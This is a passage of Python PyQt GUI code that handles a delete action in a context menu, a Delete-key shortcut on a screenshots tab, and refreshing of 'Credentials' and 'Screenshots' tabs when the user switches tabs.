        menu.addAction("Delete", self.delete_selected_screenshots)
        menu.exec(self.ss_list.viewport().mapToGlobal(position))

    def keyPressEvent(self, event):
        if event.key() == Qt.Key.Key_Delete:
            current_tab = self.tabs.currentWidget()
            if current_tab == self.screenshots_tab:
                self.delete_selected_screenshots()
                event.accept()
                return
        super().keyPressEvent(event)

    def on_tab_changed(self, index):
        tab_name = self.tabs.tabText(index)
        if tab_name == "Credentials":
            self.update_credentials_tab()
        elif tab_name == "Screenshots":
            self.refresh_screenshots()